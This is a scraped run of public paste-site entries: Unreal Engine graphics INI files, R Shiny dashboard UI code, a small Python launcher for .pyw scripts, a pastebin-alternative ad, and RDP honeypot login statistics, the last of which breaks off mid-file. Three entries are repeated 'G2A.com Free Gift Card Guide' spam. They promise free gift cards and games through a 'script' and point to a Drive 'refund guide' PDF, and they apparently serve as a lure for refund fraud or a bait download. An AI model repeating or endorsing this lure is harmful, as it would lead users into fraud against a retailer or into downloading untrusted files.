eEGuHjKd,💰G2A.com Free Gift Card Guide 2024 May🤑,pestinha,Python,Wednesday 29th of May 2024 09:20:07 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7420690.pdf

Working as of:

29 May 2024"
ggwueVm3,Cinematic.ini,DanTreble,INI file,Wednesday 29th of May 2024 09:13:11 PM CDT,"[PostProcessQuality@Cine]
r.MotionBlurQuality=4
r.AmbientOcclusionMipLevelFactor=0.4
r.AmbientOcclusionMaxQuality=100
r.AmbientOcclusionLevels=-1
r.AmbientOcclusionRadiusScale=1.0
r.GTAO.Numangles=4
r.DepthOfFieldQuality=4
r.RenderTargetPoolMin=1000
r.LensFlareQuality=3
r.SceneColorFringeQuality=1
r.EyeAdaptationQuality=2
r.BloomQuality=5
r.FastBlurThreshold=100
r.Upscale.Quality=3
r.Tonemapper.GrainQuantization=1
r.LightShaftQuality=1
r.Filter.SizeScale=1
r.Tonemapper.Quality=5

; DOF settings:
r.DOF.Gather.AccumulatorQuality=1        ; higher gathering accumulator quality
r.DOF.Gather.PostfilterMethod=1          ; Median3x3 postfilering method
r.DOF.Gather.EnableBokehSettings=1       ; bokeh simulation when gathering
r.DOF.Gather.RingCount=5                 ; high number of samples when gathering
r.DOF.Scatter.ForegroundCompositing=1    ; additive foreground scattering
r.DOF.Scatter.BackgroundCompositing=2    ; background scattering occlusion
r.DOF.Scatter.EnableBokehSettings=1      ; no bokeh simulation when scattering
r.DOF.Scatter.MaxSpriteRatio=0.25        ; only a maximum of 10% of scattered bokeh
r.DOF.Recombine.Quality=2                ; highest slight out of focus
r.DOF.Recombine.EnableBokehSettings=1    ; bokeh simulation on slight out of focus
r.DOF.TemporalAAQuality=1                ; more stable temporal accumulation
r.DOF.Kernel.MaxForegroundRadius=0.025
r.DOF.Kernel.MaxBackgroundRadius=0.025

[TextureQuality@Cine]
r.Streaming.MipBias=0
r.Streaming.AmortizeCPUToGPUCopy=0
r.Streaming.MaxNumTexturesToStreamPerFrame=0
r.Streaming.Boost=1
r.MaxAnisotropy=8
r.VT.MaxAnisotropy=8
r.Streaming.LimitPoolSizeToVRAM=0
r.Streaming.PoolSize=3000
r.Streaming.MaxEffectiveScreenSize=0

[EffectsQuality@Cine]
r.TranslucencyLightingVolumeDim=64
r.RefractionQuality=2
r.SSR.Quality=4
r.SSR.HalfResSceneColor=0
r.SceneColorFormat=4
r.DetailMode=2
r.TranslucencyVolumeBlur=1
r.MaterialQualityLevel=1 ; High quality
r.AnisotropicMaterials=1
r.SSS.Scale=1
r.SSS.SampleSet=2
r.SSS.Quality=1
r.SSS.HalfRes=0
r.SSGI.Quality=4
r.EmitterSpawnRateScale=1.0
r.ParticleLightQuality=2
r.SkyAtmosphere.AerialPerspectiveLUT.FastApplyOnOpaque=0
r.SkyAtmosphere.AerialPerspectiveLUT.SampleCountMaxPerSlice=8
r.SkyAtmosphere.AerialPerspectiveLUT.DepthResolution=32.0
r.SkyAtmosphere.FastSkyLUT=0
r.SkyAtmosphere.FastSkyLUT.SampleCountMin=4.0
r.SkyAtmosphere.FastSkyLUT.SampleCountMax=256.0
r.SkyAtmosphere.SampleCountMin=8.0
r.SkyAtmosphere.SampleCountMax=256.0
r.SkyAtmosphere.TransmittanceLUT.UseSmallFormat=0
r.SkyAtmosphere.TransmittanceLUT.SampleCount=30.0
r.SkyAtmosphere.MultiScatteringLUT.SampleCount=20.0
r.SkyLight.RealTimeReflectionCapture=1
fx.Niagara.QualityLevel=4

[ShadowQuality@Cine]
r.LightFunctionQuality=1
r.ShadowQuality=5
r.Shadow.CSM.MaxCascades=10
r.Shadow.MaxResolution=4096
r.Shadow.MaxCSMResolution=4096
r.Shadow.RadiusThreshold=0
r.Shadow.DistanceScale=1.0
r.Shadow.CSM.TransitionScale=1.0
r.Shadow.PreShadowResolutionFactor=1.0
r.DistanceFieldShadowing=1
r.DistanceFieldAO=1
r.AOQuality=2
r.VolumetricFog=1
r.VolumetricFog.GridPixelSize=4
r.VolumetricFog.GridSizeZ=128
r.VolumetricFog.HistoryMissSupersampleCount=16
r.LightMaxDrawDistanceScale=1
r.CapsuleShadows=1

[ViewDistanceQuality@Cine]
r.SkeletalMeshLODBias=0
r.ViewDistanceScale=10.0

[AntiAliasingQuality@Cine]
r.PostProcessAAQuality=6
"
rLdMCywh,Epic.ini,DanTreble,INI file,Wednesday 29th of May 2024 09:10:51 PM CDT,"[PostProcessQuality@3]
r.MotionBlurQuality=4
r.AmbientOcclusionMipLevelFactor=0.4
r.AmbientOcclusionMaxQuality=100
r.AmbientOcclusionLevels=-1
r.AmbientOcclusionRadiusScale=1.0
r.DepthOfFieldQuality=2
r.RenderTargetPoolMin=400
r.LensFlareQuality=2
r.SceneColorFringeQuality=1
r.EyeAdaptationQuality=2
r.BloomQuality=5
r.FastBlurThreshold=100
r.Upscale.Quality=3
r.Tonemapper.GrainQuantization=1
r.LightShaftQuality=1
r.Filter.SizeScale=1
r.Tonemapper.Quality=5

; DOF settings.
r.DOF.Gather.AccumulatorQuality=1        ; higher gathering accumulator quality
r.DOF.Gather.PostfilterMethod=1          ; Median3x3 postfilering method
r.DOF.Gather.EnableBokehSettings=0       ; no bokeh simulation when gathering
r.DOF.Gather.RingCount=4                 ; medium number of samples when gathering
r.DOF.Scatter.ForegroundCompositing=1    ; additive foreground scattering
r.DOF.Scatter.BackgroundCompositing=2    ; additive background scattering
r.DOF.Scatter.EnableBokehSettings=1      ; bokeh simulation when scattering
r.DOF.Scatter.MaxSpriteRatio=0.1         ; only a maximum of 10% of scattered bokeh
r.DOF.Recombine.Quality=1                ; cheap slight out of focus
r.DOF.Recombine.EnableBokehSettings=0    ; no bokeh simulation on slight out of focus
r.DOF.TemporalAAQuality=1                ; more stable temporal accumulation
r.DOF.Kernel.MaxForegroundRadius=0.025
r.DOF.Kernel.MaxBackgroundRadius=0.025

[TextureQuality@3]
r.Streaming.MipBias=0
r.Streaming.AmortizeCPUToGPUCopy=0
r.Streaming.MaxNumTexturesToStreamPerFrame=0
r.Streaming.Boost=1
r.MaxAnisotropy=8
r.VT.MaxAnisotropy=8
r.Streaming.LimitPoolSizeToVRAM=0
r.Streaming.PoolSize=1000
r.Streaming.MaxEffectiveScreenSize=0

[EffectsQuality@3]
r.TranslucencyLightingVolumeDim=64
r.RefractionQuality=2
r.SSR.Quality=3
r.SSR.HalfResSceneColor=0
r.SceneColorFormat=4
r.DetailMode=2
r.TranslucencyVolumeBlur=1
r.MaterialQualityLevel=1 ; High quality
r.AnisotropicMaterials=1
r.SSS.Scale=1
r.SSS.SampleSet=2
r.SSS.Quality=1
r.SSS.HalfRes=0
r.SSGI.Quality=3
r.EmitterSpawnRateScale=1.0
r.ParticleLightQuality=2
r.SkyAtmosphere.AerialPerspectiveLUT.FastApplyOnOpaque=1 ; Always have FastSkyLUT 1 in this case to avoid wrong sky
r.SkyAtmosphere.AerialPerspectiveLUT.SampleCountMaxPerSlice=4
r.SkyAtmosphere.AerialPerspectiveLUT.DepthResolution=16.0
r.SkyAtmosphere.FastSkyLUT=1
r.SkyAtmosphere.FastSkyLUT.SampleCountMin=4.0
r.SkyAtmosphere.FastSkyLUT.SampleCountMax=128.0
r.SkyAtmosphere.SampleCountMin=4.0
r.SkyAtmosphere.SampleCountMax=128.0
r.SkyAtmosphere.TransmittanceLUT.UseSmallFormat=0
r.SkyAtmosphere.TransmittanceLUT.SampleCount=10.0
r.SkyAtmosphere.MultiScatteringLUT.SampleCount=15.0
r.SkyLight.RealTimeReflectionCapture=1
fx.Niagara.QualityLevel=3

[ShadowQuality@3]
r.LightFunctionQuality=1
r.ShadowQuality=5
r.Shadow.CSM.MaxCascades=10
r.Shadow.MaxResolution=2048
r.Shadow.MaxCSMResolution=2048
r.Shadow.RadiusThreshold=0.01
r.Shadow.DistanceScale=1.0
r.Shadow.CSM.TransitionScale=1.0
r.Shadow.PreShadowResolutionFactor=1.0
r.DistanceFieldShadowing=1
r.DistanceFieldAO=1
r.AOQuality=2
r.VolumetricFog=1
r.VolumetricFog.GridPixelSize=8
r.VolumetricFog.GridSizeZ=128
r.VolumetricFog.HistoryMissSupersampleCount=4
r.LightMaxDrawDistanceScale=1
r.CapsuleShadows=1

[ViewDistanceQuality@3]
r.SkeletalMeshLODBias=0
r.ViewDistanceScale=1.0

[AntiAliasingQuality@3]
r.PostProcessAAQuality=4


"
JjtWBMgC,OldShinyUIFunction.R,RichardRogers,R,Wednesday 29th of May 2024 08:56:03 PM CDT,"ui <- fluidPage(

  theme = Config$DashboardTheme,

  # App title ----
  titlePanel(Config$DashboardTitle),

  tabsetPanel(type = ""tabs"",
              tabPanel(""Frequency"",      verbatimTextOutput(""Frequency"")),
              tabPanel(""Best of"",        verbatimTextOutput(""Best of"")),
              tabPanel(""Cities by Name"", verbatimTextOutput(""T1"")),
              tabPanel(""City Map"",       verbatimTextOutput(""T2""))
  ),

  # Sidebar layout with input and output definitions ----
  sidebarLayout(

    # Sidebar panel for inputs ----
    sidebarPanel(
      selectInput(
        inputId = ""UIFreq""
        , label = ""Frequency By""
        , choices = Frequencies
        , selected = Frequencies[1]
      )

      , selectInput(
        inputId = ""UIYear""
        , label = ""Year""
        , choices = RiderYears$cyclingyear
        , selected = RiderYears$cyclingyear[1]
      )

      , selectInput(
        inputId = ""UIQuarter""
        , label = ""Quarter""
        , choices = Quarters$Quarter
        , selected = Quarters$Quarter[1]
      )

      , selectInput(
        inputId = ""UIMonth""
        , label = ""Month""
        , choices = Months$Months
        , selected = Months$Months[1]
      )
    ), # sidebarPanel

    mainPanel(
      fluidRow(
        plotOutput(""Plot1"")
      ) # fluidRow

    ) # mainPanel
  ) # sidebarLayout
) # fluidPage"
xsA6Ddnd,UpdatedShinyUIFunction.R,RichardRogers,R,Wednesday 29th of May 2024 08:53:08 PM CDT,"ui <- fluidPage(

  theme = shinytheme(Config$DashboardTheme),

  # App title ----
  titlePanel(Config$DashboardTitle),

  navbarPage(
    ""Tabs:"",

    tabPanel(""Frequency"",

      sidebarLayout(

        # Sidebar panel for inputs ----
        sidebarPanel(
          selectInput(
            inputId = ""UIFreq"",
            label = ""Frequency By"",
            choices = Frequencies,
            selected = Frequencies[1]
          ),

          selectInput(
            inputId = ""UIYear"",
            label = ""Year"",
            choices = RiderYears$cyclingyear,
            selected = RiderYears$cyclingyear[1],
          ),

          selectInput(
            inputId = ""UIQuarter"",
            label = ""Quarter"",
            choices = Quarters$Quarter,
            selected = Quarters$Quarter[1]
          ),

          selectInput(
            inputId = ""UIMonth"",
            label = ""Month"",
            choices = Months$Months,
            selected = Months$Months[1]
          )
        ), # sidebarPanel

        mainPanel(
          # fluidRow(
          #   # plotlyOutput(""DistPlot"")
          # ) # fluidRow

          # textOutput(""Plot1"")
          fluidRow(
            plotOutput(""Plot1"")
          )

        ) # mainPanel

      ) # sidebarLayout
    ), # tabPanel(""Frequency"")

    tabPanel(""Best of"",
      sidebarLayout(

        # Sidebar panel for inputs ----
        sidebarPanel(
          selectInput(
            inputId = ""UIBestOfFreq"",
            label = ""Best of"",
            choices = BestOf,
            selected = BestOf[1]
          ),

          selectInput(
            inputId = ""UIYear"",
            label = ""Year"",
            choices = RiderYears$cyclingyear,
            selected = RiderYears$cyclingyear[1]
          ),

          selectInput(
            inputId = ""UIQuarter"",
            label = ""Quarter"",
            choices = Quarters$Quarter,
            selected = Quarters$Quarter[1]
          ),

          selectInput(
            inputId = ""UIMonth"",
            label = ""Month"",
            choices = Months$Months,
            selected = Months$Months[1]
          )
        ), # sidebarPanel

        mainPanel(
          fluidRow(
            plotOutput(""Plot2"")
          ) # fluidRow
        ) # mainPanel

      ) # sidebarLayout
    ), # tabPanel(""Best of"")

    tabPanel(""Cities by Name"", verbatimTextOutput(""T1"")),
    tabPanel(""City Map"",       verbatimTextOutput(""T2""))

  ) # navbarPage()

) # fluidPage
"
qrwEUkfL,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Wednesday 29th of May 2024 08:39:09 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
..
......................................
......"
970zXpGM,🎉G2A.com Free Gift Card Guide 2024 May🔥,lookos13,Python,Wednesday 29th of May 2024 08:05:04 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7293113.pdf

Working as of:

29 May 2024"
TM2EjJyK,💰G2A.com Free Gift Card Guide 2024 May🔥,pestinha,Python,Wednesday 29th of May 2024 07:59:01 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7293113.pdf

Working as of:

29 May 2024"
nnn0bWiM,T-MENU.pyw,Najeebsk,Python,Wednesday 29th of May 2024 07:34:16 PM CDT,"import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
from ttkthemes import ThemedTk

def list_pyw_files(directory):
    """"""List all .pyw files in the specified directory.""""""
    return [f for f in os.listdir(directory) if f.endswith('.pyw')]

def open_pyw_file(filename):
    """"""Open the selected .pyw file.""""""
    try:
        subprocess.Popen(['pythonw', filename], shell=True)
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to open file: {e}"")

def on_file_select(event):
    """"""Event handler for file selection.""""""
    selected_index = file_listbox.curselection()
    if selected_index:
        selected_file = file_listbox.get(selected_index)
        open_pyw_file(os.path.join(folder_path, selected_file))

# Specify the folder containing .pyw files
folder_path = 'C:/CMDER/TOOLS'

# List all .pyw files in the folder
pyw_files = list_pyw_files(folder_path)

# Create the main window with a theme
root = ThemedTk(theme=""arc"")
root.title(""Najeeb Select a .pyw File to Open"")

# Create a frame for better layout control
frame = ttk.Frame(root, padding=""10"")
frame.pack(fill=tk.BOTH, expand=True)

# Create a Listbox to display the .pyw files
file_listbox = tk.Listbox(frame, selectmode=tk.SINGLE, height=15)
for file in pyw_files:
    file_listbox.insert(tk.END, file)
file_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))

# Create a scrollbar for the Listbox
scrollbar = ttk.Scrollbar(frame, orient=tk.VERTICAL, command=file_listbox.yview)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
file_listbox.config(yscrollcommand=scrollbar.set)

# Bind the selection event to the handler
file_listbox.bind('<<ListboxSelect>>', on_file_select)

# Start the GUI event loop
root.mainloop()
"
BrTyhqcJ,2024-05-29_stats.json,rdp_snitch,JSON,Wednesday 29th of May 2024 07:18:12 PM CDT,"{
  ""ip"": {
    ""114.217.18.245"": 15,
    ""118.122.196.39"": 12,
    ""185.198.69.5"": 15,
    ""106.58.219.212"": 3,
    ""185.198.69.16"": 3,
    ""180.136.3.186"": 15,
    ""185.198.69.7"": 3,
    ""117.16.46.253"": 6,
    ""134.119.207.154"": 27,
    ""185.198.69.15"": 6,
    ""119.167.77.62"": 12,
    ""206.189.32.215"": 3,
    ""113.31.112.144"": 6,
    ""45.83.64.195"": 3,
    ""140.246.215.173"": 6,
    ""116.58.51.242"": 3,
    ""124.67.254.109"": 21,
    ""119.96.234.88"": 3,
    ""106.58.212.195"": 6,
    ""150.223.76.57"": 9,
    ""185.198.69.13"": 3,
    ""185.198.69.3"": 3,
    ""221.229.220.51"": 3,
    ""112.116.111.230"": 21,
    ""43.133.3.182"": 9,
    ""203.56.4.242"": 6,
    ""106.225.199.92"": 6,
    ""185.198.69.11"": 6,
    ""43.226.53.56"": 18,
    ""150.223.46.21"": 9,
    ""47.180.107.12"": 12,
    ""106.58.215.193"": 6,
    ""58.218.204.183"": 9,
    ""218.78.58.53"": 3,
    ""47.116.4.18"": 3,
    ""198.44.167.61"": 9,
    ""117.41.184.60"": 9,
    ""106.58.164.84"": 6,
    ""14.29.228.234"": 3,
    ""185.198.69.4"": 3,
    ""203.57.39.224"": 12,
    ""185.198.69.9"": 6,
    ""182.42.62.22"": 3,
    ""205.210.31.40"": 9,
    ""81.246.124.198"": 6,
    ""64.23.218.92"": 3,
    ""187.157.89.218"": 3,
    ""14.29.142.134"": 15,
    ""122.227.146.74"": 9,
    ""43.133.56.30"": 6,
    ""36.111.146.78"": 9,
    ""111.161.41.132"": 3,
    ""222.93.104.67"": 3,
    ""47.100.38.137"": 9,
    ""150.223.32.106"": 12,
    ""101.34.80.30"": 3,
    ""128.199.141.142"": 6,
    ""152.42.249.196"": 6,
    ""43.136.43.178"": 3,
    ""211.91.60.69"": 6,
    ""183.6.165.166"": 9,
    ""13.70.153.24"": 3,
    ""113.31.124.58"": 3,
    ""124.225.69.183"": 3,
    ""45.153.166.4"": 210,
    ""194.165.16.78"": 6,
    ""106.55.54.44"": 3,
    ""185.196.220.41"": 9,
    ""185.170.144.3"": 6,
    ""203.33.207.66"": 9,
    ""194.165.16.37"": 6,
    ""1.168.148.191"": 6,
    ""199.45.154.54"": 3,
    ""106.58.211.156"": 3,
    ""123.56.20.194"": 6,
    ""49.84.226.2"": 6,
    ""198.235.24.239"": 9,
    ""114.112.14.39"": 12,
    ""218.65.17.106"": 15,
    ""194.165.16.76"": 6,
    ""213.109.202.237"": 12,
    ""103.75.182.179"": 3,
    ""165.154.138.85"": 3,
    ""117.23.59.141"": 3,
    ""205.210.31.178"": 9,
    ""2.57.149.186"": 6,
    ""87.251.75.64"": 3,
    ""14.18.41.26"": 6,
    ""106.58.166.180"": 3,
    ""152.32.183.22"": 3,
    ""51.89.9.215"": 3,
    ""34.72.251.13"": 3,
    ""61.171.106.140"": 3,
    ""137.117.58.16"": 3,
    ""106.225.199.24"": 6,
    ""125.77.197.43"": 6,
    ""198.235.24.87"": 9,
    ""167.94.138.121"": 3,
    ""97.91.36.242"": 6,
    ""167.94.138.126"": 3
  },
  ""asn"": {
    ""AS4134"": 165,
    ""AS57523"": 48,
    ""AS18031"": 6,
    ""AS29066"": 27,
    ""AS4837"": 42,
    ""AS14061"": 18,
    ""AS17621"": 9,
    ""AS208843"": 3,
    ""AS58519"": 75,
    ""AS17563"": 3,
    ""AS58563"": 3,
    ""AS132203"": 15,
    ""AS134238"": 21,
    ""AS134762"": 18,
    ""AS5650"": 12,
    ""AS4812"": 6,
    ""AS37963"": 18,
    ""AS142032"": 9,
    ""AS396982"": 39,
    ""AS5432"": 6,
    ""AS8151"": 3,
    ""AS45090"": 9,
    ""AS8075"": 6,
    ""AS19437"": 210,
    ""AS48721"": 18,
    ""AS208046"": 9,
    ""AS197414"": 6,
    ""AS3462"": 6,
    ""AS398722"": 3,
    ""AS134700"": 12,
    ""AS208312"": 18,
    ""AS151858"": 3,
    ""AS135377"": 6,
    ""AS134768"": 3,
    ""AS208091"": 3,
    ""AS58466"": 6,
    ""AS16276"": 3,
    ""AS133775"": 6,
    ""AS398324"": 6,
    ""AS20115"": 6
  },
  ""isp"": {
    ""Chinanet"": 162,
    ""Chang Way Technologies Co. Limited"": 48,
    ""Sangmyung University"": 6,
    ""velia.net Internetdienste GmbH"": 27,
    ""CNC Group CHINA169 Shandong Province Network"": 12,
    ""DigitalOcean, LLC"": 18,
    ""UCLOUD"": 9,
    ""INTERNET-RESEARCH"": 3,
    ""Cloud Computing Corporation"": 75,
    ""NEXLINX"": 3,
    ""CNC Group CHINA169 Neimeng Province Network"": 21,
    ""CHINANET Hubei province network"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 18,
    ""CHINANET Jiangx province IDC network"": 21,
    ""CHINANET Liaoning province Dalian MAN network"": 18,
    ""Frontier Communications Solutions"": 12,
    ""China Telecom (Group)"": 6,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""High Family Technology Co., Limited"": 9,
    ""Google LLC"": 39,
    ""Proximus"": 6,
    ""Uninet S.A. de C.V."": 3,
    ""Aceville Pte.ltd"": 6,
    ""China Unicom Tianjin Province Network"": 3,
    ""Addresses CNNIC"": 9,
    ""CHINA UNICOM China169 Backbone"": 6,
    ""Microsoft Corporation"": 6,
    ""Hainan Network of ChinaTelecom"": 3,
    ""Secured Servers LLC"": 210,
    ""Flyservers S.A."": 18,
    ""ColocationX Ltd."": 9,
    ""Xhost Internet Solutions LP"": 9,
    ""Chunghwa Telecom Co., Ltd."": 6,
    ""Censys, Inc."": 9,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""Sinoycloud Limited"": 12,
    ""Red Byte LLC"": 18,
    ""BQT"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""CHINANET SHAANXI province Cloud Base network"": 3,
    ""China Telecom"": 12,
    ""OVH SAS"": 3,
    ""Charter Communications"": 6
  },
  ""org"": {
    ""Chinanet JS"": 36,
    ""Chinanet SC"": 12,
    ""Chang Way Technologies Co. Limited"": 66,
    ""Chinanet YN"": 48,
    ""Chinanet GX"": 15,
    ""Korean Education Network"": 6,
    ""Eijaj Hussain Shaikhnag"": 27,
    ""Unknown"": 57,
    ""DigitalOcean, LLC"": 18,
    ""Shanghai UCloud Information Technology Company Limited"": 9,
    ""Chinanet SD"": 39,
    ""NEXLINX"": 3,
    ""Chinanet HB"": 3,
    ""Tencent Cloud Computing"": 9,
    ""Chinanet FJ"": 27,
    ""Chinanet JX"": 36,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 18,
    ""FTR3 FiberOptic-S Westminster CA"": 12,
    ""Chinanet SH"": 6,
    ""Alibaba.com LLC"": 3,
    ""VpsQuan L.L.C"": 9,
    ""Chinanet GD"": 33,
    ""Palo Alto Networks, Inc"": 36,
    ""Quantum ICT"": 6,
    ""Uninet S.A. de C.V."": 3,
    ""Ningbo chaoji mamawangluojishu ltd"": 9,
    ""Chinanet ZJ"": 9,
    ""Aliyun Computing Co., LTD"": 15,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 6,
    ""Unicom"": 6,
    ""Microsoft Azure Cloud (australiasoutheast)"": 3,
    ""Net"": 210,
    ""Flyservers S.A"": 18,
    ""Tencent cloud computing (Beijing) Co., Ltd."": 3,
    ""Makut Investments"": 9,
    ""Xhostis"": 6,
    ""Chunghwa Telecom Co. Ltd."": 6,
    ""Censys, Inc."": 3,
    ""CNISP-Union Technology (Beijing) Co., Ltd"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Chinanet SN"": 3,
    ""Xhost Internet Solutions"": 3,
    ""Ucloud Information Technology"": 3,
    ""OVH GmbH"": 3,
    ""Google Cloud (us-central1)"": 3,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Censys, Inc"": 6,
    ""Spectrum"": 6
  },
  ""regionName"": {
    ""Guangdong"": 69,
    ""Sichuan"": 12,
    ""Moscow"": 60,
    ""Yunnan"": 48,
    ""Guangxi"": 15,
    ""Seoul"": 6,
    ""Grand Est"": 27,
    ""Shandong"": 51,
    ""South West"": 15,
    ""Beijing"": 36,
    ""Land Berlin"": 3,
    ""Punjab"": 3,
    ""Inner Mongolia"": 21,
    ""Shanghai"": 27,
    ""Jiangsu"": 18,
    ""Tokyo"": 9,
    ""Fujian"": 33,
    ""Jiangxi"": 36,
    ""California"": 51,
    ""Kowloon"": 9,
    ""Brussels Capital"": 6,
    ""Mexico City"": 3,
    ""Zhejiang"": 18,
    ""North West"": 6,
    ""Tianjin"": 3,
    ""Victoria"": 3,
    ""Hainan"": 3,
    ""Virginia"": 225,
    ""Kaunas"": 18,
    ""North Holland"": 9,
    ""Taichung City"": 6,
    ""New York"": 3,
    ""Ho Chi Minh"": 3,
    ""Hesse"": 3,
    ""Shanxi"": 3,
    ""Lesser Poland"": 6,
    ""England"": 3,
    ""Iowa"": 3,
    ""Michigan"": 12
  },
  ""country"": {
    ""China"": 393,
    ""Russia"": 60,
    ""South Korea"": 6,
    ""France"": 27,
    ""Singapore"": 21,
    ""Germany"": 6,
    ""Pakistan"": 3,
    ""Japan"": 9,
    ""United States"": 294,
    ""Hong Kong"": 9,
    ""Belgium"": 6,
    ""Mexico"": 3,
    ""Australia"": 3,
    ""Lithuania"": 18,
    ""The Netherlands"": 9,
    ""Taiwan"": 6,
    ""Vietnam"": 3,
    ""Poland"": 6,
    ""United Kingdom"": 3
  },
  ""account"": {
    ""142.93.8.59"": 477,
    ""Administr"": 63,
    ""Test"": 24,
    ""hello"": 243,
    ""user"": 3,
    ""AFsBLIgTy"": 3,
    ""qOMEYh"": 3,
    ""MIfSfm"": 3,
    ""(empty)"": 12,
    ""Domain"": 21,
    ""EJeYyvoSb"": 3,
    ""HHbdgF"": 3,
    ""MHWUpl"": 3,
    ""Administrator"": 6,
    ""HLLgNcQAE"": 3,
    ""hIMfDh"": 3,
    ""vzRpYu"": 3,
    ""NyCLdmPcd"": 3,
    ""AsQQwH"": 3,
    ""jvTeKS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 885
  },
  ""client_build"": {
    ""Unknown"": 885
  },
  ""client_name"": {
    ""Unknown"": 885
  },
  ""ip_type"": {
    ""Unknown"": 396,
    ""proxy"": 69,
    ""hosting"": 204,
    ""hosting & proxy"": 213,
    ""mobile"": 3
  }
}"
ck4V1m9G,2024-05-29_stats.json,rdp_snitch,JSON,Wednesday 29th of May 2024 07:16:08 PM CDT,"{
  ""ip"": {
    ""114.217.18.245"": 10,
    ""118.122.196.39"": 8,
    ""185.198.69.5"": 10,
    ""106.58.219.212"": 2,
    ""185.198.69.16"": 2,
    ""180.136.3.186"": 10,
    ""185.198.69.7"": 2,
    ""117.16.46.253"": 4,
    ""134.119.207.154"": 18,
    ""185.198.69.15"": 4,
    ""119.167.77.62"": 8,
    ""206.189.32.215"": 2,
    ""113.31.112.144"": 4,
    ""45.83.64.195"": 2,
    ""140.246.215.173"": 4,
    ""116.58.51.242"": 2,
    ""124.67.254.109"": 14,
    ""119.96.234.88"": 2,
    ""106.58.212.195"": 4,
    ""150.223.76.57"": 6,
    ""185.198.69.13"": 2,
    ""185.198.69.3"": 2,
    ""221.229.220.51"": 2,
    ""112.116.111.230"": 14,
    ""43.133.3.182"": 6,
    ""203.56.4.242"": 4,
    ""106.225.199.92"": 4,
    ""185.198.69.11"": 4,
    ""43.226.53.56"": 12,
    ""150.223.46.21"": 6,
    ""47.180.107.12"": 8,
    ""106.58.215.193"": 4,
    ""58.218.204.183"": 6,
    ""218.78.58.53"": 2,
    ""47.116.4.18"": 2,
    ""198.44.167.61"": 6,
    ""117.41.184.60"": 6,
    ""106.58.164.84"": 4,
    ""14.29.228.234"": 2,
    ""185.198.69.4"": 2,
    ""203.57.39.224"": 8,
    ""185.198.69.9"": 4,
    ""182.42.62.22"": 2,
    ""205.210.31.40"": 6,
    ""81.246.124.198"": 4,
    ""64.23.218.92"": 2,
    ""187.157.89.218"": 2,
    ""14.29.142.134"": 10,
    ""122.227.146.74"": 6,
    ""43.133.56.30"": 4,
    ""36.111.146.78"": 6,
    ""111.161.41.132"": 2,
    ""222.93.104.67"": 2,
    ""47.100.38.137"": 6,
    ""150.223.32.106"": 8,
    ""101.34.80.30"": 2,
    ""128.199.141.142"": 4,
    ""152.42.249.196"": 4,
    ""43.136.43.178"": 2,
    ""211.91.60.69"": 4,
    ""183.6.165.166"": 6,
    ""13.70.153.24"": 2,
    ""113.31.124.58"": 2,
    ""124.225.69.183"": 2,
    ""45.153.166.4"": 140,
    ""194.165.16.78"": 4,
    ""106.55.54.44"": 2,
    ""185.196.220.41"": 6,
    ""185.170.144.3"": 4,
    ""203.33.207.66"": 6,
    ""194.165.16.37"": 4,
    ""1.168.148.191"": 4,
    ""199.45.154.54"": 2,
    ""106.58.211.156"": 2,
    ""123.56.20.194"": 4,
    ""49.84.226.2"": 4,
    ""198.235.24.239"": 6,
    ""114.112.14.39"": 8,
    ""218.65.17.106"": 10,
    ""194.165.16.76"": 4,
    ""213.109.202.237"": 8,
    ""103.75.182.179"": 2,
    ""165.154.138.85"": 2,
    ""117.23.59.141"": 2,
    ""205.210.31.178"": 6,
    ""2.57.149.186"": 4,
    ""87.251.75.64"": 2,
    ""14.18.41.26"": 4,
    ""106.58.166.180"": 2,
    ""152.32.183.22"": 2,
    ""51.89.9.215"": 2,
    ""34.72.251.13"": 2,
    ""61.171.106.140"": 2,
    ""137.117.58.16"": 2,
    ""106.225.199.24"": 4,
    ""125.77.197.43"": 4,
    ""198.235.24.87"": 6,
    ""167.94.138.121"": 2,
    ""97.91.36.242"": 4,
    ""167.94.138.126"": 2
  },
  ""asn"": {
    ""AS4134"": 110,
    ""AS57523"": 32,
    ""AS18031"": 4,
    ""AS29066"": 18,
    ""AS4837"": 28,
    ""AS14061"": 12,
    ""AS17621"": 6,
    ""AS208843"": 2,
    ""AS58519"": 50,
    ""AS17563"": 2,
    ""AS58563"": 2,
    ""AS132203"": 10,
    ""AS134238"": 14,
    ""AS134762"": 12,
    ""AS5650"": 8,
    ""AS4812"": 4,
